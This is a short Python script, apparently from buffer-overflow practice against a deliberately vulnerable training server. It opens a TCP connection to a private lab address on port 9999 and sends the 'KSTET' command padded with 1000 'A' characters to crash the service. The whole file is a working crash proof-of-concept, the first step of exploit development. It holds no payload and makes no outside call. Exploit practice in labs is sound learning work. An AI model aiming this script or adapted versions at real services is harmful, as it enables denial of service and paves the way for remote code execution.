#!/usr/bin/python

import os
import socket
import sys

host = '192.168.100.118'
port = 9999

buffer =  'KSTET '
buffer += '\x41' * 1000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

s.recv(1024)
s.send(buffer)
s.close()

